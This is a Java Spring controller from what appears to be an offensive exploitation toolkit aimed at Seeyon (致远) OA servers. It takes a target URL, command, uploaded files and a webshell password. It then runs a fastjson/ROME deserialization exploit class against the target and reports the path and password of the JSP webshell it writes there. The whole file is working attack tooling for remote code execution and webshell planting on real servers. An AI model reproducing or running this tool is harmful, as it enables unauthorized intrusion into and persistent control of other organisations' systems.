package com.droplab.Controller.Seeyon;

import com.droplab.Controller.BaseController;
import com.droplab.Controller.Seeyon.Service.A6V5FastJson;
import com.droplab.Utils.CommonUtils;
import org.jsoup.Connection;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 致远OA利用
 */
@Controller
@RequestMapping("/seeyon")
public class SeeyonController implements BaseController {
    @RequestMapping(value = "/index", method = RequestMethod.GET)
    public String index(Model model) {
        CommonUtils.modelSet(new HashMap<>(), model);
        return "Seeyon/index.html";
    }

    /**
     * 致远V6A5.6  fastjson二次反序列化不出网利用。fastjson+ROME二次反序列化
     * @param model
     * @return
     */
    @RequestMapping(value = "/A6V5FastJson",method = RequestMethod.POST)
    public String A6V5FastJson(Model model,
                               @RequestParam(value = "url",required=true)String url,
                               @RequestParam(value = "mOption",required=true)String mOption,
                               @RequestParam(value = "cmd" ,required=false,defaultValue = "")String cmd,
                               @RequestParam(value = "files", required = false) List<MultipartFile> files,
                               @RequestParam(value = "mType", required = false,defaultValue = "") String mType,
                               @RequestParam(value = "mMiddle", required = false,defaultValue = "") String mMiddle,
                               @RequestParam(value = "path", required = false,defaultValue = "") String path,
                               @RequestParam(value = "mshellType", required = false,defaultValue = "") String mshellType,
                               @RequestParam(value = "password", required = false,defaultValue = "") String password){
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            if (!url.contains("/seeyon")) {
                url = url + "/seeyon";
            }
            HashMap hashMap = new HashMap();
            hashMap.put("url",url);
            hashMap.put("mOption",mOption);
            if(!cmd.equals("")){
                hashMap.put("cmd",cmd);
            }if(!mType.equals("")){
                hashMap.put("mType",mType);
            }if(!mMiddle.equals("")){
                hashMap.put("mMiddle",mMiddle);
            }if(!path.equals("")){
                hashMap.put("path",path);
            }if(!mshellType.equals("")){
                hashMap.put("mshellType",mshellType);
            }if(!password.equals("")){
                hashMap.put("password",password);
            }
            String filename=CommonUtils.RandomStr(8);
            hashMap.put("filename",filename);
            if (files != null && !files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            A6V5FastJson a6V5FastJson =(A6V5FastJson) Class.forName(getMap().get("A6V5FastJson")).newInstance();
            a6V5FastJson.setParams(hashMap);
            Connection.Response exploit = a6V5FastJson.exploit();
            if (exploit != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(exploit.bodyAsBytes());
                modelMap.put("A6V5FastJsonurl", url);
                modelMap.put("A6V5FastJson",s);
                modelMap.put("A6V5FastJsontips", String.format("如果写入成功，webshell路径：/%s.jsp,密码：%s", filename,password));
                CommonUtils.modelSet(modelMap, model);
                return "Seeyon/index.html";
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("A6V5FastJsonurl", url);
        modelMap.put("A6V5FastJson", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "Seeyon/index.html";
    }


    @Override
    public Map<String, String> getMap() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("A6V5FastJson", "com.droplab.Controller.Seeyon.Service.A6V5FastJson");
        return hashMap;
    }
}

